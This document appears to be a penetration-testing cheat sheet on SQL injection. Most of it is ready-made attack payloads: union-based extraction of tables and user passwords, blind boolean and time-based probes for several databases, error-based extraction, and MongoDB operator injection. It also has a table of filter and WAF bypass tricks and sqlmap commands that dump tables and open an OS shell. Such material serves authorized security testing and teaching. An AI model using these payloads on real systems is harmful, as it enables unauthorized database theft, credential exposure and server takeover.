# SQL Injection

## Detection
Test: `'`, `"`, `' OR 1=1 --`, `1' AND '1'='1` in URL params, POST body, cookies, headers (User-Agent, Referer, X-Forwarded-For), JSON fields. Watch for: error messages, response length changes, time delays.

## Union-Based
```sql
' ORDER BY 1--                     -- increment to find column count
' UNION SELECT NULL,NULL,NULL--    -- match column count
' UNION SELECT 'a',NULL,NULL--    -- find reflected column
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password,NULL FROM users--
```

## Blind Boolean
```sql
' AND 1=1--    -- true → normal page
' AND 1=2--    -- false → different page
' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'--
' AND ASCII(SUBSTRING(password,1,1))>96--   -- binary search
```

## Blind Time-Based
```sql
-- MySQL:    ' AND SLEEP(5)--
-- Postgres: ' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
-- SQLite:   ' AND CASE WHEN (1=1) THEN randomblob(100000000) ELSE 0 END--
-- MSSQL:    ' IF (1=1) WAITFOR DELAY '0:0:5'--
```

## Error-Based
```sql
-- MySQL:  ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--
-- PG:     ' AND 1=CAST((SELECT version()) AS int)--
-- MSSQL:  ' AND 1=CONVERT(int,(SELECT @@version))--
```

## SQLite
```sql
' UNION SELECT name,sql,NULL FROM sqlite_master--   -- list tables+schemas
```

## NoSQL (MongoDB)
```json
{"username":{"$ne":""},"password":{"$ne":""}}
{"username":"admin","password":{"$regex":"^a.*"}}
```
URL: `?username[$ne]=x&password[$ne]=x`

## Filter Bypass
| Filter | Bypass |
|---|---|
| Spaces | `/**/`, `%09`, `%0a`, `+`, parentheses |
| Keywords (SELECT, UNION) | Case variation, `SEL/**/ECT`, double-write |
| Quotes | `0x61646D696E` (hex), `CHAR()` |
| `=` | `LIKE`, `IN()`, `BETWEEN`, `REGEXP` |
| `OR`/`AND` | `\|\|`, `&&` |

## sqlmap
```bash
sqlmap -u "<url>?id=1" --dbs                     # enumerate DBs
sqlmap -u "<url>?id=1" -D db -T tbl --dump       # dump table
sqlmap -r request.txt --dbs                       # from saved request
sqlmap -u "<url>?id=1" --os-shell                 # shell (MySQL)
sqlmap -u "<url>?id=1" --tamper=space2comment     # WAF bypass
```

## Second-Order
Payload stored (e.g., username registration), executed later when the stored value is used in a query (e.g., password change). Test by registering with `admin'-- ` as username.
